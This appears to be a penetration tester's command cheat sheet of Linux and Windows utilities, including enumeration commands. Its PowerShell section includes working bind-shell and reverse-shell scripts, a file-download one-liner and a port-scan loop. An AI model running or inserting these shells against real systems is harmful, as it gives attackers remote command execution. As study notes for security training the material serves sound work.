Displays manual of specified command.  
  
The Unix manual consists of eight sections, and each man page has its command name followed by the section number in parenthesis.

| Section# | Topic                                               |
| -------- | --------------------------------------------------- |
| 1        | Commands available to users                         |
| 2        | Unix and C system calls                             |
| 3        | C library routines for C programs                   |
| 4        | Special file names                                  |
| 5        | File formats and conventions for files used by Unix |
| 6        | Games                                               |
| 7        | Word processing packages                            |
| 8        | System administration commands and procedures       |

Show information for the **passwd** command (section 1 of the manual).
```bash
man passwd
```

Show information for the /etc/passwd file (section 5 of the manual).
```bash
man 5 passwd
```

**-k** - Search manpage descriptions for given keyword and display results. Equivalent to **apropos**.   Using regex:
```bash
man -k '^passwd$'
```
	enclosed by **^** and **$** will ensure matching of entire line and no sub-string matches


|  Navigation   |                                       |
|:-------------:| ------------------------------------- |
|     **/**     | Search for specified text w/in manual |
|     **N**     | Next search result                    |
| **Shift + N** | Previous search result                |


# mkdir
#linuxCmd

Creates specified directory  

| Options |                                                                  |
|:-------:| ---------------------------------------------------------------- |
| **-p**  | Make multiple directories and their parent directories as needed |
| **{}**  | Create multiple directories w/ lists                             |

```bash
mkdir -p test/recon

mkdir -p test/{recon,exploit,report}  
mkdir {a-z}
```


# mount
#linuxCmd  #deviceManipulation

Mount a filesystem.  
  
Usage:  
```bash
mount <device> <dir>
```

_/etc/fstab_ may contain lines describing what devices are usually mounted, where, and using which options.  
  
To override mount options from _/etc/fstab_, you need to use the **-o** switch ---- Multiple options can be strung together with a _**,**_  

|   Options    |                                             |     |
|:------------:| ------------------------------------------- | ----- |
|    **-o**    | Override mount options from /etc/fstab      |     |
|    |  **nolock**  | Disable file locking (used w/ **-o**)       |
|    | **vers=**_n_ | Mounts via NFS version _n_ (used w/ **-o**) |


Remove a persistant share:  
```bash
unmount -f -l /mnt/dir
```


# net
#winCmd

#### Enumerate all local accounts:
```powershell
net user
```

#### Enumerate all users in a the entire domain:
```powershell
net user /domain
```

#### Query a specific user within a domain
```powershell
net user <username> /domain
```

#### Enumerate list of groups:
```powershell
net localgroup
```
	Add group name to enumerate users in that group
	
#### Enumerate all groups within a domain:
```powershell
net group /domain
```

#### Examine running services:
```powershell
net start/ stop
```

#### Enumerate list of domains, computers, or resources being shared by the specified computer
```powershell
net view
```

#### Connect/ Disconnect one comp to a shared resource (drives/ printers/ etc) or displays info about connections:
```powershell
net use
```

#### Delete a session:
```powershell
net use /delete
```

#### Specify IP address to connect to w/ **net use**:
```powershell
net use \\<IP>
```

#### Terminate outbound session:
```powershell
net use /del
```

#### Enumerate inbound sessions:
```powershell
net session
```

#### Terminate inbound session:
```powershell
net session \\<ip> /del
```


See [MS's reference](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc730899(v=ws.11)) for cmd line syntax & usage:

| Options | Desc |
| ---- | ---- |
| ACCOUNTS | Set the policy settings on local computer |
| COMPUTER | Adds or deletes a computer from a domain db |
| CONFIG |  |
| CONTINUE |  |
| FILE |  |
| GROUP | Adds, displays, or mods global groups in domains. |
| HELP |  |
| HELPMSG |  |
| LOCALGROUP | Adds, displays, or mods local groups. |
| NAME |  |
| PAUSE |  |
| PRINT | Displays info about a specified printer queue or specified print job, or controls a specified print job |
| SEND |  |
| SESSION | Manages server computer connections |
| SHARE | Manages shared resources |
| START |  |
| STATISTICS |  |
| STOP |  |
| TIME |  |
| USE | Connects a comp to/ disconnects from a shared resource,  displays info about comp connections, or controls persistent net conns |
| USER | Adds/ modifies user accounts or displays user account info |
| VIEW | Displays list of domains, computers, or resources being shared by the specified comp. |

# netstat
#linuxCmd #winCmd #networkEnum 

Network Statistics   

Mostly obsolete. Useful in Windows  

|      Cmd       |  Replaced by   |
|:--------------:|:--------------:|
|  **netstat**   |     **ss**     |
| **netstat -r** |  **ip route**  |
| **netstat -i** | **ip -s link** |
| **netstat -g** |  **ip maddr**  |
  
| Options |                                                                               |
|:-------:| ----------------------------------------------------------------------------- |
| **_n_** | Automatically refresh every _n_ seconds                                       |
| **-a**  | Display all active (listening & non-listening) TCP connections                |
| **-b**  | Display .exe (or .dll) name associated w/ listening process (req admin/ root) |
| **-c**  | Continuous monitoring: Print info from route cache                            |
| **-g**  | Display multicast group membership info                                       |
| **-i**  | Display table of all network interfaces                                       |
| **-l**  | Display only listening sockets                                                |
| **-m**  | Display list of masqueraded conns                                             |
| **-n**  | Display address & port number in numerical form (Turns off name resolution)   |
| **-o**  | Display owner PID of each conn                                                |
| **-p**  | Display process PID & name the conn belongs to                                |
| **-r**  | Display kernel routing tables                                                 |
| **-s**  | Display statistics for each protocol                                          |
| **-t**  | Display TCP only                                                              |
| **-u**  | Display UDP only                                                              |
| **-w**  | Display raw information                                                       |

# PowerShell
#winCmd 


[PowerShell](https://docs.microsoft.com/en-us/powershell/) 5.0 runs on the following versions of Windows:  
• Windows Server 2016, installed by default  
• Windows Server 2012 R2/Windows Server 2012/Windows Server 2008 R2 with Service Pack 1/Windows 8.1/Windows 7 with Service Pack 1 (install Windows Management Framework 5.0 to run it)  
  
PowerShell 4.0 runs on the following versions of Windows:  
• Windows 8.1/Windows Server 2012 R2, installed by default  
• Windows 7 with Service Pack 1/Windows Server 2008 R2 with Service Pack 1 (install Windows Management Framework 4.0 to run it)  
  
PowerShell 3.0 runs on the following versions of Windows:  
• Windows 8/Windows Server 2012, installed by default  
• Windows 7 with Service Pack 1/Windows Server 2008 R2 with Service Pack 1/2 (install Windows Management Framework 3.0 to run it)  

  
[https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py)  
  
The default policy is “Restricted”, which effectively means the system will neither load PowerShell configuration files nor run PowerShell scripts  
  
### To set an Unrestricted policy:  
• Run PowerShell as an Administrator  
• **Set-ExecutionPolicy Unrestricted**  
  
Verify with **Get-ExecutionPolicy**   
  
**-c** - Execute given command (wrapped in double-quotes)  
**new-object** - Cmdlet that allows instantiation of either a .NET framework or COM object  
**iex** - Cmdlet that evaluates or runs a specified string as a command and returns the results of the expression or command  

### File transfer:
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://ip address/wget.exe','C:\Users\*****\Desktop\wget.exe')"  
wget.exe -V
```
- **WebClient** class, which is defined and implemented in the [System.Net](https://docs.microsoft.com/en-us/dotnet/api/system.net?view=netframework-4.7.2) namespace.  
	- The **WebClient** class is used to access resources identified by a URI and it exposes a public method called **DownloadFile**  
- **DownloadFile** requires two key parameters: a source location (in the form of a URI as we previously stated), and a target location where the retrieved data will be stored.

### Port Scanning:
```powershell
Test-NetConnection -Port 445 192.168.50.151
```

Script to scan ports 1-1024 on target IP:     (Takes forever)
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```
	Pipe the first 1024 integers into a for loop which assigns the integer to the variable $_
	Create a _Net.Sockets.TcpClient_ object & perform a TCP conn against the target IP on that port
	If successful, prompt a log message including the open port

### Bind Shell:
Use **-n** when connecting w/ [netcat](Tools.md#netcat) as bind shell may not always present command prompt on initial connection.
```powershell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);  
$listener.start();  
$client = $listener.AcceptTcpClient();  
$stream = $client.GetStream();  
[byte[]]$bytes = 0..65535|%{0};  
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)  
{  
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);  
    $sendback = (iex $data 2>&1 | Out-String );  
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';  
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);  
    $stream.Write($sendbyte,0,$sendbyte.Length);  
    $stream.Flush()  
}  
$client.Close();  
$listener.Stop();
```

### Reverse Shells:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('ip address',port);   
$stream = $client.GetStream();   
[byte[]]$bytes = 0..65535|%{0};   
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)   
{   
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);   
    $sendback = (iex $data 2>&1 | Out-String );   
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';   
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);   
    $stream.Write($sendbyte,0,$sendbyte.Length);   
    $stream.Flush();   
}   
$client.Close();
```

### Find RW files & directories (here w/in the Program Files dir):  
```powershell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

### List drivers:  
```powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
```

### Find driver version:
```powershell
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

### Cmdlets:

**Get-EventLog** - Query Windows Events/ Log parser
	**-LogName** - Name of log to retrieve
	**|** - Can pip for more detailed info
		Ex:
 ```powershell
Get-EventLog -LogName <log> | Format-List -Property * ; | Format-List -Property EventId, Message
```

**Get-Content** - Similar to cat
**Get-ChildItem** - Gets items in one or more specified locations
**Set-Content** -Used to create content and ADS streams
	Ex:
```powershell
Set-Content -Path <.\file.ext> -Stream <ads.ext>
```

# ps
#linuxCmd #processes #envRecon 

Lists processes system-wide. Also predefined alias for **Get-Process** cmdlet in powershell  
  
|       Options        |                                                                                                                         |
|:--------------------:| ----------------------------------------------------------------------------------------------------------------------- |
|        **-a**        | Select all processes of all users                                                                                       |
|        **-u**        | Select by effective user ID (EUID) or name. User-oriented format that provides detailed information about the processes |
|        **-x**        | List the processes without a controlling terminal                                                                       |
|        **-C**        | Select by command name                                                                                                  |
|   **-A** OR **-e**   | Select all processes                                                                                                    |
|        **-f**        | Display full format listing                                                                                             |
|        **-o**        | Specify individual output columns. Can be list. (**comm**, **pmem**, **pcpu**, etc)                                     |
| **--sort** _±column_ | Sort by column. _+_ Sorts ascending. _-_ Sorts by descending                                                            |
|     **--forest**     | Displays processes in a tree format for better child-parent relationship                                                |

```bash
    PID TTY      TIME     CMD  
   2960 pts/0    00:00:00 bash  
   2983 pts/0    00:00:00  \_ ps
```
  
![[ps_sorting.png]]
  
EXAMPLES  
To see every process on the system using standard syntax:  
```bash
ps -e  
ps -ef  
ps -eF  
ps -ely
```

To see every process on the system using BSD syntax:  
```bash
ps ax  
ps axu
```

To print a process tree:  
```bash
ps -ejH  
ps axjf
```

To get info about threads:  
```bash
ps -eLf  
ps axms
```

To get security info:  
```bash
ps -eo euser,ruser,suser,fuser,f,comm,label  
ps axZ  
ps -eM
```

To see every process running as root (real & effective ID) in user format:  
```bash
ps -U root -u root u
```

To see every process with a user-defined format:  
```bash
s -eo pid,tid,class,rtprio,ni,pri,psr,pcpu,stat,wchan:14,comm  
ps axo stat,euid,ruid,tty,tpgid,sess,pgrp,ppid,pid,pcpu,comm  
ps -Ao pid,tt,user,fname,tmout,f,wchan
```

Print only the process IDs of syslogd:  
```bash
ps -C syslogd -o pid=
```

Print only the name of PID 42:  
```bash
ps -q 42 -o comm=
```


# rdesktop

Usage
```bash
rdesktop [IP] -u [user] -p [passwd]
```

# reg
#winCmd #envRecon 

Registry Console Tool

|      Options       |                                                                                   |
|:------------------:| --------------------------------------------------------------------------------- |
| **query** _regkey_ | Returns a list of the next tier of subkeys and entries for requested registry key |


# route
#linuxCmd #winCmd #networkEnum #networkManipulation

Display and manipulate Routing table info.

\*Note:  Could be possible to add another network to the routing table and connect to it.
	(Ex: You're on a Class C, but can add a Class A (supposedly "segmented") network and connect (proving it's not fully isolated))

![](route.png)
	The first line of output indicates that any traffic received by the machine that is not in the 192.168.52.0/24 range gets forwarded to the default gateway, 192.168.52.254. (We know that it is /24 because earlier we learned that the CIDR of 255.255.255.0 is /24.) That gateway then takes care of forwarding the packets further. Any traffic destined for 192.168.52.0/24 gets _forwarded_ to 0.0.0.0, which means the traffic does not travel any farther.
	[0.0.0.0](https://en.wikipedia.org/wiki/0.0.0.0) is a special IP address that usually designates an unknown or unroutable destination. However, its use in routing tables indicates the default route that traffic should take unless specified by another entry in the table.
	In other words, our VM can reach any machine on the 192.168.52.0/24 subnet. Any machines on that subnet can reach it too, all without the help of a router, because they belong to the same network class.
	Additionally, we cannot reach any other subnets or networks directly. All the traffic generated on the VM that doesn't specifically match the second line goes out to the default gateway. The default gateway (a simple router or a firewall) will then decide which packets to forward and to where.



# sc
#winCmd #envRecon #serviceRecon #serviceManipulation

Service Control.  Create, start, stop, query, or delete any Windows service.

|   Option   |                                                                        |
|:----------:| ---------------------------------------------------------------------- |
| **config** | Modifies value of a service's entries in the reg & SC Manager database |
| **query**  | Displays more info about the specified service/ driver                 |


# schtasks
#winCmd #envRecon #processes #serviceRecon #serviceManipulation 

List scheduled Windows tasks

| Options |                                                         |
|:-------:| ------------------------------------------------------- |
| **/ru** | Run with perms of a different user or with system perms |
| **/tn** | Filter by TaskName                                      |
| **/u**  | Run w/ the creds of an Admin of the remote computer     |


# scp
#linuxCmd #dataTransfer 

Securely Transfer Files  
  
Relies **ssh** for data transfer. **:** is how **scp** distinguishes btw local and remote locations  
  
Local file to remote system:
```bash
scp [OPTION] file remote_user@IP:/path/to/save
```

Remote file to local system:
```bash
scp [OPTION] remote_user@IP:/remote/file /local/path/to/save
```

Remote file to remote system:
```bash
scp [OPTION] remote1@IP:/remote/file remote2@IP:/path/to/save
```
	* to route traffic through the local machine, add the **-3** option  
  
| Options  |                                                              |
|:--------:| ------------------------------------------------------------ |
|    -P    | Specifies remote host ssh port                               |
| **-p** | Preserves file's modification and access times               |
| **-q** | Suppress the progress meter and non-error messages           |
| **-C** | Forces compressing the data as it's sent to the dest machine |
| **-r** | Copy directories recursively                                 |


# sed
#linuxCmd #textProcessing 

Complex stream editor used to perform basic text transformations on an input stream (a file or input from a pipeline).    
  
[https://catonmat.net/sed-one-liners-explained-part-one](https://catonmat.net/sed-one-liners-explained-part-one)  
  
Invocation:  
```bash
sed <script> <inputfile>
```

| Options |                           |
| ------- | ------------------------- |
| **-e**  | Executes a script         |
| **-i**  | Replace the file in-place |
| g       | Applies the replacement to all matches, not just the first  |

To replace all occurrences of ‘hello’ to ‘world’ in the file input.txt:  
```bash
sed 's/hello/world/' input.txt > output.txt
```
 
To change a UUID of 1001 to 1014:  
```bash
sudo sed -i -e 's/1001/1014/g' /etc/passwd
```


# sort
#linuxCmd #textProcessing 

Sort lines of text files  

| Options |                                                                                                             |
|:-------:| ----------------------------------------------------------------------------------------------------------- |
| **-d**  | Consider only blanks and alphanumeric characters                                                            |
| -**o**  | Write result to ouput file rather than STDOUT                                                               |
| **-n**  | Compare according to string numerical value (useful w/ **uniq -c**)**-r** - Reverse result of comparisons** |
| **-u**  | With -c, check for strict ordering; without -c, output only the first of an equal run                       |



# sudo
#linuxCmd #privs

Allows a permitted user to execute a command as the superuser or another user, as specified by the security policy.

|  Options   |                                                                                                                    |
|:----------:| ------------------------------------------------------------------------------------------------------------------ |
|     **-b**     | Run given command in the background   \*Can't use job control for manipulation                                     |
|     **-e**     | Edit one or more files                                                                                             |
| **-g** *group* | Runs the command w/ the primary group set to *group* instead.  Can use *\#gid* rather than name.  \*May need to escape *#*                   |
|     **-i**     | Simulate initial login - login-specific resource files ie: *.profile* & *.login* are read.                         |
|     **-K**     | Invalidates user's cached creds & removes them entirely                                                            |
|     **-k**     | Invaliedates user's cached creds.                                                                                  |
|     **-l**     | If no command is specified, lists the allowed & forbidden cmds for the invoking user. \*Can specify user w/ **-U**; See [compgen](OS%20Commands.md#compgen) |
|     **-n**     | Prevents sudo from promptin the user for a pw.   If a pw is req'd, it'll error out                                 |
| **-r** *role*  | Causes the new (SELinux) security context to have the role specified by *role*                                     |
|     **-S**     | stdin.   Reads the pw from the stdin instead of the terminal.  \*Must be followed by a newline char                |
| **-U** *user*  | Used w/ **-l** option; Specifies the user whose privileges should be listed                                        |
| **-u** *user*  | Runs the specified command as a user other than *root*.  Can use *\#uid* rather than name. \*May need to escape *#*    |                                                                                                            |



# tail
#linuxCmd #fileProcessing 

Display last 10 (default) lines of a file.  
  
Most often used to monitor log file entries in real time.  

|  Options   |                                                  |
|:----------:| ------------------------------------------------ |
|   **-f**   | Follow. Continually updates output as file grows |
| **-n** _x_ | Changes default line output to _x_               |


# tar
#linuxCmd #fileProcessing 

Compress/ decompress .tar / .tar.gz  
  
| Options |                                                    |
|:-------:| -------------------------------------------------- |
| **-x**  | Extract files from the zipped file                 |
| **-v**  | Verbose mode (lists out the files it's extracting) |
| **-z**  | Decompress files                                   |
| **-f**  | Selects file to work on                            |
| **-c**  | Creates new archive                                |


# tasklist
#winCmd #processes 

Examine Windows processes at the command line

| Options  |                                                                              |
|:--------:| ---------------------------------------------------------------------------- |
| **/fi**  | Filters types of processes to include or exclude (ex: "imagename eq <.exe>") |
|  **/m**  | List all tasks w/ DLL modules loaded (Can use DLL name for query)            |
| **/svc** | List all service info for each process (Maps a service to its process)       |
|  **/v**  | Verbose output                                                               |


# tcpdump
Command line version of [Wireshark](wireshark.md). Network sniffer used for analyzing network traffic and debugging network services  
  
Ability to capture network traffic determined by local user permissions.  
  
  
Can both capture network packets and read from existing capture files  

| Options           | Desc                                              |
| ----------------- | ------------------------------------------------- |
| **-A**            | Print each packet in ascii. Useful for web pages. |
| **-n**            | Don't convert addresses (ip, port, etc) to names  |
| **-r** _file_     | Read from a _file_                                |
| **src host** _ip_ | Filter by source host                             |
| **dst host** _ip_ | Filter by destination host                        |
| **port** _port_   | Filter by port. Requires **-n** switch            |
| **-X**            | Print packet data in both HEX and ASCII           |

  
[Header](TCP%20-%20Header-Flags.md) **Filtering:**  
  
In order to see only ACK and PSH flags, we need to filter for both the 4th and 5th bit of the 14th byte of the TCP header.  
Turning on only these bits would give us 00011000, or decimal 24, which we can pass as a display filter, hopefully only giving us the HTTP requests and responses data.  

```bash
‘tcp[13] = 24’
```


As a byte array starts w/ 0, we use 13 to specify the 14th byte.  
  
Ex:  
```bash
sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
```

OR  
(NEED TO GET SYNTAX DOWN - KEEPS ERRORING OUT DURING PARSING)  
```bash
sudo tcpdump -A -n 'tcp[tcpflags] & tcp-ack == tcp-ack' -r password_cracking_filtered.pcap
```


# uname
#linuxCmd #envRecon 

Displays basic information about the operating system name and system hardware.  

| Options |                                                                                         |
|:-------:| --------------------------------------------------------------------------------------- |
| **-a**  | Print all information, in the following order, except omit **-p** and **-i** if unknown |
| **-s**  | Print the kernel name                                                                   |
| **-n**  | Print the network node hostname                                                         |
| **-r**  | Print the kernel release                                                                |
| **-v**  | Print the kernel version                                                                |
| **-m**  | Print the machine hardware name                                                         |
| **-p**  | Print the processor type (non-portable)                                                 |
| **-i**  | Print the hardware platform (non-portable)                                              |
| **-o**  | Prints operating-system                                                                 |


# uniq
#linuxCmd #fileProcessing #textProcessing 

Report or omit repeated lines  
  
| Options |                                                |
|:-------:| ---------------------------------------------- |
| **-c**  | Prefixes lines with the number of occurrences  |
| **-d**  | Only print duplicate lines, one for each group |
| **-D**  | Print all duplicate lines                      |
| **-i**  | Ignore case when comparing                     |
| **-u**  | Only print unique lines                        |


# vimdiff
#linuxCmd #fileProcessing 

Opens vim with multiple files, one in each window. The differences between files are highlighted  
  
|   Navigation    |                                                             |
|:------------:| ----------------------------------------------------------- |
|    **do**    | Gets changes from the other window into the current one     |
|    **dp**    | Puts the changes from the current window into the other one |
|   **] c**    | Jumps to the next change                                    |
|   **\[ c**   | Jumps to the previous change                                |
| **Ctrl + W** | Switches to the other split window                          |


# watch
#linuxCmd #processes 

Run a designated command at regular intervals (default every 2 seconds) 

|       Options        |                                                                                                                   |
|:--------------------:| ----------------------------------------------------------------------------------------------------------------- |
|      **-n** _x_      | Changes default interval to _x_ seconds                                                                           |
|        **-e**        | Freeze on command error. Exits on key press                                                                       |
|        **-g**        | Exit when output of command changes                                                                               |
| **-x** OR **--exec** | Pass command to **exec**(2) instead of **sh -c**. Reduces the need to use extra quoting to get the desired effect |
|        **-h**        | Display help and exit                                                                                             |


# wevtuil
#winCmd #envRecon 

Retrieve info about Windows event logs and publishers (Win 7 -10)

|    Options     |                                                                |
|:--------------:| -------------------------------------------------------------- |
|     **/f**     | Format to (ex: **/f:text** )                                   |
| **/if**<\path> | Path to a log file                                             |
|     **qe**     | Query-Events <\path> - Default, provide a log name for <\path> |


# wget
#linuxCmd #dataTransfer 

Downloads files using the HTTP/HTTPS and FTP protocols.  

|     Options     |                                                  |
|:---------------:| ------------------------------------------------ |
|     **-o**      | Allows saving file to given directory/ file name |
|  **--spider**   | Doesn't download the pages                       |
| **--recursive** | Turn on recursive retrieving                     |


# which
#linuxCmd #envRecon #processes 

Searches for given executable within the _$PATH_ environment and displays its full path


# wmic
#winCmd #processes #serviceManipulation 


Utility that provides access to the _Windows Management Instrumentation_, which is the infrastructure for management data and operations on Windows.  
  
*One important thing to keep in mind is that the product WMI class only lists applications that are installed by the Windows Installer.  
It will not list applications that do not use the Windows Installer.

| Verb                                                         | Action                                                                                          |
| ------------------------------------------------------------ | ----------------------------------------------------------------------------------------------- |
| **process list <brief / full>**                              | Displays either brief or fully detailed information about a (or multiple) running process(es)   |
| **get	<name, parentprocessid, processid, commandline ,etc>** | Displays information for specific fields                                                        |
| **where processid=<\pid> get <\field>**                      | Focus on a specific process; can use any(?) field header such as **description="<\desc name>"** |
| **startup <list brief / full>**                              | Examine either brief or fully detailed information about startup items                          |
| **delete**                                                   | Deletes the process                                                                             |


| Switch       | Condition                                                                                                                                                                                                                                                                                                                                                                       | Possible values                                                                                                                                                                                                                                                                                             | Default                                                      |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
| /NAMESPACE   | The namespace that the aliases typically use                                                                                                                                                                                                                                                                                                                                    | Any namespace                                                                                                                                                                                                                                                                                               | root\cimv2                                                   |
| /ROLE        | The namespace that WMIC typically looks in for aliases and other WMIC information. When the role changes, the WMIC interactive command prompt changes to match the role. WMIC only has one role by default (\\root\cli), so you only have switch roles if you have a management product that has defined other roles, or if other roles have been created at your organization. | Any namespace that contains aliases.                                                                                                                                                                                                                                                                        | root\cli                                                     |
| /NODE        | Computer names, comma delimited. All commands are synchronously executed against all computers listed in this value. File names must be prefixed with '@'. Computer names within a file must be comma-delimited, or put on separate lines, or both.                                                                                                                             | Any computer name, a list of computer names, or a file with computer names in it.                                                                                                                                                                                                                           | Local computer name                                          |
| /IMPLEVEL    | Impersonation level                                                                                                                                                                                                                                                                                                                                                             | Anonymous, Identify, Impersonate, Delegate                                                                                                                                                                                                                                                                  | Impersonate                                                  |
| /AUTHLEVEL   | Authentication level                                                                                                                                                                                                                                                                                                                                                            | Default, None, Connect, Call, Pkt, Pktintegrity, Pktprivacy                                                                                                                                                                                                                                                 | Pktprivacy                                                   |
| /LOCALE      | Locale                                                                                                                                                                                                                                                                                                                                                                          | MS_409 (English), MS_411 (Japanese), MS_40B (Finnish), and so on.                                                                                                                                                                                                                                           | The default language on the computer when WMIC is installed. |
| /PRIVILEGES  | Enable all privileges.                                                                                                                                                                                                                                                                                                                                                          | ENABLE or DISABLE                                                                                                                                                                                                                                                                                           | Enabled                                                      |
| /TRACE       | The success or failure of all functions used to execute WMIC commands is displayed.                                                                                                                                                                                                                                                                                             | ON or OFF                                                                                                                                                                                                                                                                                                   | Off                                                          |
| /RECORD      | Records all output to an XML file. Output is also displayed at the command prompt.                                                                                                                                                                                                                                                                                              | File name                                                                                                                                                                                                                                                                                                   | Not set and no default file name exists.                     |
| /INTERACTIVE | Typically, delete commands are confirmed.                                                                                                                                                                                                                                                                                                                                       | ON or OFF                                                                                                                                                                                                                                                                                                   | OFF in NON-INTERACTIVE mode; ON in INTERACTIVE mode          |
| /FAILFAST    | Whether or not the /NODE computers are checked before trying to execute the WMIC commands against them. When FAILFAST is ON, WMIC pings the computers in the /NODE switch before sending WMIC commands to them. If they do not respond to the ping, the WMIC commands are not executed for them.                                                                                | ON or OFF                                                                                                                                                                                                                                                                                                   | OFF                                                          |
| /USER        | A user name to be used by WMIC when accessing the /NODE computers or computers specified in aliases. You are prompted for the password. A user name cannot be used with a local computer.                                                                                                                                                                                       | Any user name.                                                                                                                                                                                                                                                                                              | Not set                                                      |
| /PASSWORD    | A password to be used by WMIC when accessing the /NODE computers (possibly including the local computer). The password is visible at the command line.                                                                                                                                                                                                                          | Any password                                                                                                                                                                                                                                                                                                | Not set                                                      |
| /OUTPUT      | Specifies a mode for output redirection. All output is directed to the destination given only. Output does not appear at the command line. The destination is cleared before the output begins.                                                                                                                                                                                 | STDOUT, CLIPBOARD, or a file name. STDOUT is the command line. Clipboard is the Windows clipboard. The output can then be pasted to any program that accepts data in the format produced. For more details, see the following note.                                                                         | STDOUT                                                       |
| /APPEND      | Specifies a mode for output redirection. All output is directed to the destination given only. Output does not appear at the command line. The destination is not cleared before the output begins. The new output is appended to the current contents of the destination.                                                                                                      | STDOUT, CLIPBOARD, or a file name. STDOUT is the command line. Clipboard is the Windows clipboard. The output can then be pasted to any program that accepts data in the format produced. See the following note for more details.                                                                          | STDOUT                                                       |
| /AGGREGATE   | Used with the LIST and GET/EVERY switch. If AGGREGATE is ON, LIST and GET display their results when all computers in the NODE property have either responded or timed out. If AGGREGATE is OFF, LIST and GET display their results as soon as they are received.                                                                                                               | ON or OFF                                                                                                                                                                                                                                                                                                   | ON                                                           |
| /AUTHORITY   | Specifies the authority type for the connection.                                                                                                                                                                                                                                                                                                                                | Needed if the value assigned to the IMPLEVEL switch is Delegate (for example, /IMPELEVEL:Delegate). It contains the authority definition string: "kerberos:TargetDomainName\TargetComputerName". For this setting to succeed, computers need to have trust for delegation enabled on the Domain Controller. | Not set                                                      |


The **List** verb has the following adverbs. To use adverbs in WMIC, enter the alias name followed by a verb and adverb. For more information about **\<alias\> /?**, see "Aliases" in Help:

| Verb   | Action                                                                                                                                                                                                                                                                                                                                                                                                                     | Parameters or Verb-specific switches                                                                                                                                              | Example                                                                               |
| ------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| ASSOC  | Returns the result of the query: Associators of {\<wmi object\>} Where \<wmi object\> is the path of objects returned by the PATH or CLASS commands. The results are instances associated with the object. When ASSOC is used with an alias, the classes associated with the class underlying the alias are returned. By default, the output for class is in TABLE format. See the following table of switches for /ASSOC. | Optionally, an output file format, such as LIST, MOF, or other.                                                                                                                   | OS ASSOC                                                                              |
| CALL   | Executes methods.                                                                                                                                                                                                                                                                                                                                                                                                          | Method and parameter list if appropriate. Parameter lists are comma delimited. Use SERVICE CALL /? to get a list of available methods and their parameters for the current alias. | SERVICE WHERE CAPTION='TELNET' CALL STARTSERVICE                                      |
| CREATE | Creates a new instance and sets the property values for the new instance. This cannot be used to create a new class.                                                                                                                                                                                                                                                                                                       | Properties equated to values, delimited with commas. Use CREATE /? for a list of property names for the alias.                                                                    | ENVIRONMENT CREATE Name="WMIC_test",VariableValue="WMIC_test_value",UserName="SYSTEM" |
| DELETE | Deletes the current instance or set of instances. This can be used to delete a class.                                                                                                                                                                                                                                                                                                                                      | /INTERACTIVE (prompt to confirm) or /NOINTERACTIVE (do not prompt to confirm).                                                                                                    | PROCESS WHERE NAME="CALC.EXE" DELETE                                                  |
| GET    | Get specific properties.                                                                                                                                                                                                                                                                                                                                                                                                   | Property name or switch. See the table of switches for /GET below. Also use GET /? for a list of property names and switches for the alias.                                       | PROCESS GET NAME                                                                      |
| LIST   | Show data. LIST is the default verb.                                                                                                                                                                                                                                                                                                                                                                                       | See the following tables of adverbs and switches for LIST.                                                                                                                        | PROCESS LIST BRIEF                                                                    |
| SET    | Property set operations.                                                                                                                                                                                                                                                                                                                                                                                                   | Properties equated to values, delimited with commas. Use SET /? for a list of property names for the alias.                                                                       | ENVIRONMENT WHERE Name="WMIC_test" SET VariableValue="WMIC_test_value1"               |


The **List** verb has the following switches. To use verb-specific switches in WMIC, enter the alias name followed by a switch (verbs and adverbs might also be used). For more information about **\<alias\> /?**, see "Aliases" in Help:

| Adverb                        | Results                                                                                                                                       |
| :---------------------------: | --------------------------------------------------------------------------------------------------------------------------------------------- |
| BRIEF                         | A core set of the properties.                                                                                                                 |
| FULL                          | The full set of properties. This is the default set of LIST properties.                                                                       |
| INSTANCE                      | The instance paths only.                                                                                                                      |
| STATUS                        | The status and related properties of the object.                                                                                              |
| SYSTEM                        | System properties.                                                                                                                            |
| Alias-specific or user format | Alias-specific or user defined formats might be defined by providing distinct lists of properties and a format to be used in displaying them. |
| WRITEABLE                     | The writeable properties of the objects.                                                                                                      |


The **Get** verb has the following switches:

|              Switch              | Effect                                                                                                                                 |
|:--------------------------------:| -------------------------------------------------------------------------------------------------------------------------------------- |
|              /VALUE              | The output is formatted with each value listed on a separate line and with the name of the property.                                   |
|               /ALL               | The output is formatted as a table. The default output format is /ALL.                                                                 |
| /TRANSLATE:\<translation table\> | Translate the output using the translation table named by the command. BasicXml and NoComma are translation tables included with WMIC. |
|       /EVERY:\<interval\>        | Return values every X seconds, X is the interval.                                                                                      |
|   /FORMAT:\<format specifier\>   | Specify a keyword or an XSL file name to format the data, as explained in the following note.                                          |


The **Assoc** verb has the following switches:

|           Switch           | Effect                                                                                                               |
